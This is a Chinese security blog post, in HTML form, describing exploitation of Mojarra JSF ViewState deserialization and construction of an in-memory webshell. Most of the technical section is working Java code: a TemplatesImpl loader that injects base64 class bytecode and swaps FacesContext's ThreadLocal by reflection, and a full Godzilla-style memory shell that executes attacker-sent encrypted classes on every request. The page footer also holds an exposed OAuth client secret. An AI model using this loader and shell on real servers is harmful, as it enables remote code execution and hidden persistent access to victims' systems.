@@ -1,0 +1,449 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Mojarra JSF 反序列化到内存马 | 白袍的小行星</title>
+<link rel="shortcut icon" href="https://red-team.tips/favicon.ico?v=1710333081950">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://red-team.tips/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Mojarra JSF 反序列化到内存马 | 白袍的小行星 - Atom Feed" href="https://red-team.tips/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="某次攻防演练中遇到了一个OA靶标，登录页面为login.jsf，当时并不了解JSF反序列化，还是大哥直接一发payload 打了下来，事后便有了这篇文章。
+环境搭建
+使用vulhub的环境，启动容器后将/usr/src目录下的文件拷贝出来，..." />
+    <meta name="keywords" content="Java安全" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://red-team.tips">
+  <img class="avatar" src="https://red-team.tips/images/avatar.png?v=1710333081950" alt="">
+  </a>
+  <h1 class="site-title" data-text=白袍的小行星>
+    白袍的小行星
+  </h1>
+  <p class="site-description">
+    <strong>Once a hacker, always a hacker!</strong>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/evilAdan0s" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Adan0s1" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Mojarra JSF 反序列化到内存马
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-03-23
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+                <a href="https://red-team.tips/tag/lcCB4jPEj/" class="post-tag">
+                  # Java安全
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>某次攻防演练中遇到了一个OA靶标，登录页面为<code>login.jsf</code>，当时并不了解JSF反序列化，还是大哥直接一发payload 打了下来，事后便有了这篇文章。</p>
+<h1 id="环境搭建">环境搭建</h1>
+<p>使用vulhub的环境，启动容器后将<code>/usr/src</code>目录下的文件拷贝出来，新建maven项目，打包为war，启动tomcat，开始分析。</p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<p>该漏洞利用点在<code>javax.faces.ViewState</code>参数，该参数是用来保存页面状态的，在其 2.1.29-08、2.0.11-04 版本之前，参数未加密，并且直接将其进行了反序列化。</p>
+<p>实际环境中，识别该组件可以通过以下方式：</p>
+<ul>
+<li>文件名、参数名是否有<code>jsf</code>字样</li>
+<li>表单参数默认值是否以<code>H4sIA</code>开头（Base64Gzip）</li>
+</ul>
+<p>这次靶标的漏洞参数名为<code>jsf_state_64</code>，也就是从这里发现了端倪。</p>
+<p>vulhub用的<code>jdk7u21</code>链，我这里自己加了CC依赖，然后使用了CC6，<code>ysoserial</code>生成payload，先gzip压缩，再base64编码，最后URL编码，放入参数中。<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202309111722201jLrE59ujYih.jpg" alt="202309111722201jLrE59ujYih" loading="lazy"></p>
+<h1 id="构造内存马">构造内存马</h1>
+<p>大哥的打法是根据当时的容器注入了一个Weblogic内存马，这样虽然也成功完成了任务，不过在了解了一下JSF之后，我开始思考：有没有办法依靠JSF本身的机制来构造内存马呢？</p>
+<p>JSF在国内流行度不高，以至于我找了近一周的资料，再加上和开发群群友的友好交♂流，才构造成功。<br>
+首先来看一下JSF技术的架构，其本质是MVC：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911172238oTMgjlVuXnjV.jpg" alt="20230911172238oTMgjlVuXnjV" loading="lazy"><br>
+由上图可以看出，负责处理的部分是<code>FacesServlet</code>，在<code>web.xml</code>中能看到配置：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911172248DBEeZ7lSD8qB.jpg" alt="20230911172248DBEeZ7lSD8qB" loading="lazy"><br>
+对每个JSF请求，<code>FacesServlet</code>对象都会为其获取一个<code>javax.faces.context.FacesContext</code>类的实例，<code>FacesContext</code>的实例里包含了所有处理JSF请求所需的每个请求的状态信息，如下图所示：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911172304AZY4rbH0RjFg.jpg" alt="20230911172304AZY4rbH0RjFg" loading="lazy"><br>
+可以看出，请求响应的核心就是<code>FacesContext</code>实例，它里面存放着应用程序的全部数据，我们也可以从中取出<code>request</code>以及<code>response</code>对象。</p>
+<p>如何获取该实例呢？有一个静态方法<code>FacesContext.getCurrentInstance()</code>，它会返回与当前请求对应的<code>FacesContext</code>对象：</p>
+<pre><code class="language-java">public static FacesContext getCurrentInstance() {
+    FacesContext facesContext = (FacesContext)instance.get();
+    if (null == facesContext) {
+        facesContext = (FacesContext)threadInitContext.get(Thread.currentThread());
+    }
+    return facesContext;
+}
+</code></pre>
+<p>这里的<code>instance</code>字段是什么呢？是一个静态的<code>ThreadLocal</code>对象：</p>
+<pre><code class="language-java">private static ThreadLocal&lt;FacesContext&gt; instance = new ThreadLocal&lt;FacesContext&gt;() {};
+</code></pre>
+<p>这是为了实现<code>FacesContext</code>对象能够在同个线程内进行传递，便于后续的处理器能够处理。</p>
+<p><code>FacesContext</code>并非遵循单例模式，它是每一个HTTP请求对应一个<code>FacesContext</code>对象，也就是一个线程，正常情况下为了保证线程安全，每个线程之间的变量数据都是隔离的，所以如何使得自己的内存马能够影响所有<code>FacesContext</code>对象，这是一个需要解决的问题。</p>
+<p>查找资料的时候，c0ny1师傅的<a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">半自动化挖掘request实现多种中间件回显</a>给了我一点启示：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202309111723268P4h0FxZK6X4.jpg" alt="202309111723268P4h0FxZK6X4" loading="lazy"><br>
+以及fnmsd师傅的<a href="https://blog.csdn.net/fnmsd/article/details/106709736">基于请求/响应对象搜索的Java中间件通用回显方法（针对HTTP）</a>：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911172337htbRIpDCslLs.jpg" alt="20230911172337htbRIpDCslLs" loading="lazy"><br>
+所以思路是：将正常<code>FacesContext</code>对象的<code>instance</code>字段（希望你还没有忘记它是一个<code>ThreadLocal</code>对象）利用反射替换为一个<code>A</code>对象，A应该是<code>ThreadLocal</code>的子类，并且重写了其<code>set()</code>方法，其中添加了内存马的逻辑。</p>
+<p>因为每次请求都会调用<code>ThreadLocal.set()</code>，也就会触发我们的内存马逻辑，恶意类已经被JVM加载，基本上是不会被卸载掉的，也就达到了持久化的目的。</p>
+<h1 id="具体实现">具体实现</h1>
+<p>实现部分，分为两块来完成，分别是：内存马类和替换类。</p>
+<p>所以整体逻辑就是，利用<code>TemplatesImpl</code>类加载替换类，替换类的作用是加载内存马类并替换掉原本的<code>instance</code>字段，具体代码如下：</p>
+<pre><code class="language-java">//替换类
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class Loaders {
+    public static class PayloadLoader extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements java.io.Serializable{
+        static {
+            try {
+                byte[] evilBytes;
+                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+                Class facesClass = classLoader.loadClass(&quot;javax.faces.context.FacesContext&quot;);
+                String className = &quot;org.razor.exploits.JSFMemShellGodzilla4&quot;; //内存马类名
+                String evilBytesStr = &quot;yv66vgAAA……&quot;; //内存马类字节码
+
+                Class base64Class = classLoader.loadClass(&quot;java.util.Base64&quot;);
+                Class base64DecodeClass = classLoader.loadClass(&quot;java.util.Base64$Decoder&quot;);
+                Object decoder = base64Class.getMethod(&quot;getDecoder&quot;).invoke(base64Class);
+                Method decodeMethod = base64DecodeClass.getMethod(&quot;decode&quot;, String.class);
+                evilBytes = (byte[]) decodeMethod.invoke(decoder, evilBytesStr);
+                Method defineClassMethod = classLoader.loadClass(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, Integer.TYPE, Integer.TYPE);
+                defineClassMethod.setAccessible(true);
+                Class evilClass = (Class) defineClassMethod.invoke(classLoader, className, evilBytes, Integer.valueOf(&quot;0&quot;), evilBytes.length);
+                Object evilObject = evilClass.newInstance();
+                Field field = facesClass.getDeclaredField(&quot;instance&quot;);
+                field.setAccessible(true);
+                field.set(null, evilObject);
+            } catch (Exception e) {
+            }
+        }
+        public PayloadLoader(){this.transletVersion = 101;}
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        }
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+        }
+    }
+}
+
+</code></pre>
+<pre><code class="language-java">//哥斯拉内存马类
+package org.razor.exploits;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class JSFMemShellGodzilla4 extends ThreadLocal{
+    private static ThreadLocal newInstance;
+    private static ClassLoader classLoader;
+    private static String password = &quot;pass&quot;;
+    private static String key = &quot;3c6e0b8a9c15224a&quot;;
+    private static String md5 = md5(password + key);
+    private static Class payload;
+
+    static {
+        try{
+            classLoader = Thread.currentThread().getContextClassLoader();
+            Field field = classLoader.loadClass(&quot;javax.faces.context.FacesContext&quot;).getDeclaredField(&quot;instance&quot;);
+            field.setAccessible(true);
+            newInstance = (ThreadLocal)field.get(null);
+        }catch (Exception e){
+        }
+    }
+    
+    public Class defClass(byte[] classBytes) throws Throwable {
+        Method method = classLoader.loadClass(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, Integer.TYPE, Integer.TYPE);
+        method.setAccessible(true);
+        return ((Class)method.invoke(classLoader, null, classBytes, Integer.valueOf(&quot;0&quot;), classBytes.length));
+    }
+    
+    @Override
+    public Object get(){
+        return newInstance.get();
+    }
+
+    @Override
+    public void set(Object obj){
+        newInstance.set(obj);
+        try{
+            Field field = obj.getClass().getDeclaredField(&quot;externalContext&quot;);
+            field.setAccessible(true);
+            Object externalContext = field.get(obj);
+            Field field2 = externalContext.getClass().getDeclaredField(&quot;request&quot;);
+            field2.setAccessible(true);
+            HttpServletRequest request = (HttpServletRequest)field2.get(externalContext);
+            Field field3 = externalContext.getClass().getDeclaredField(&quot;response&quot;);
+            field3.setAccessible(true);
+            HttpServletResponse response = (HttpServletResponse)field3.get(externalContext);
+
+            byte[] evilBytes = base64Decode(request.getParameter(password));
+            evilBytes = x(evilBytes, false);
+            if(payload == null){
+                payload = defClass(evilBytes);
+            }else{
+                ByteArrayOutputStream arrayOutputStream = new ByteArrayOutputStream();
+                Object f = payload.newInstance();
+                f.equals(arrayOutputStream);
+                f.equals(evilBytes);
+                f.equals(request);
+                response.getWriter().write(md5.substring(0, 16));
+                f.toString();
+                response.getWriter().write(base64Encode(x(arrayOutputStream.toByteArray(), true)));
+                response.getWriter().write(md5.substring( 16));
+            }
+
+        }catch (Exception e){
+        } catch (Throwable e) {
+        }
+    }
+
+    public static byte[] x(byte[] s,boolean m){
+        try{
+            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);
+            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(key.getBytes(),&quot;AES&quot;));
+            return c.doFinal(s);
+        }catch (Exception e){
+            return null;
+        }
+    }
+
+    public static String md5(String s) {
+        String ret = null;
+        try {
+            java.security.MessageDigest m;
+            m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);
+            m.update(s.getBytes(), 0, s.length());
+            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
+        } catch (Exception e) {
+
+        }
+        return ret;
+    }
+    public static String base64Encode(byte[] bs) throws Exception {
+        Class base64;
+        String value = null;
+        try {
+            base64=Class.forName(&quot;java.util.Base64&quot;);
+            Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);
+            value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
+        } catch (Exception e) {
+            try {
+                base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;);
+                Object Encoder = base64.newInstance();
+                value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
+            } catch (Exception e2) {
+
+            }
+        }
+        return value;
+    }
+    public static byte[] base64Decode(String bs) throws Exception {
+        Class base64;
+        byte[] value = null;
+        try {
+            base64=Class.forName(&quot;java.util.Base64&quot;);
+            Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);
+            value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });
+        } catch (Exception e)
+        {
+            try {
+            base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
+            Object decoder = base64.newInstance();
+            value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });
+            } catch (Exception e2) {
+            }
+        }
+        return value;
+    }
+}
+</code></pre>
+<p>先编译内存马类，将其base64字符串填入替换类，再编译替换类为字节码，再使用反序列化利用链加载替换类字节码，最后将payload编码：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911172415cqkjiFh0rCUN.jpg" alt="20230911172415cqkjiFh0rCUN" loading="lazy"><br>
+该方法只测试了Tomcat环境，其余环境未测试。</p>
+<h1 id="总结">总结</h1>
+<figure data-type="image" tabindex="1"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230911172425lL4zmzh85TMu.jpg" alt="20230911172425lL4zmzh85TMu" loading="lazy"></figure>
+<h1 id="参考文章">参考文章</h1>
+<ul>
+<li>https://www.cnblogs.com/nice0e3/p/16205220.html</li>
+<li>https://www.yiibai.com/jsf/jsf-life-cycle.html</li>
+<li>https://www.cnblogs.com/CoLo/p/16886829.html</li>
+<li>http://www.blogjava.net/AllanZ/archive/2009/07/20/287472.html</li>
+<li>http://www.blogjava.net/AllanZ/archive/2009/07/20/287469.html</li>
+<li>https://y4er.com/posts/solve-the-problem-of-godzilla-memory-shell-pagecontext</li>
+<li>https://xz.aliyun.com/t/10556</li>
+</ul>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC">构造内存马</a></li>
+<li><a href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0">具体实现</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">参考文章</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '971b65ce804f770e6019',
+    clientSecret: 'a9fca4ca8deef880c5fac95e97fceb4edb23098a',
+    repo: 'eviladan0s.github.io',
+    owner: 'eviladan0s',
+    admin: ['eviladan0s'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://red-team.tips/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
